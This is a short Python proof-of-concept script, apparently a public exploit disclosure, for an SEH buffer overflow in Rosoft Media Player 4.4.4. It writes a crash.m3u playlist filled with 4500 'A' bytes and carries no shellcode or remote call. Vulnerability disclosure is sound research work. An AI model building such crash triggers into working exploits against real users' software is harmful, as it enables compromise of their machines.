#rosoft media player 4.4.4 SEH buffer overflow POC
#vulnerble application link http://download.cnet.com/Rosoft-Media-Player/3000-2139_4-10044022.html
#tested on XP SP2
#author abhishek lyall - abhilyall[at]gmail[dot]com
#web - http://www.aslitsecurity.com/
#blog - http://www.aslitsecurity.blogspot.com/
#!/usr/bin/python
 
filename = "crash.m3u"
 
 
junk = "\x41" * 4500
 
textfile = open(filename , 'w')
textfile.write(junk)
textfile.close()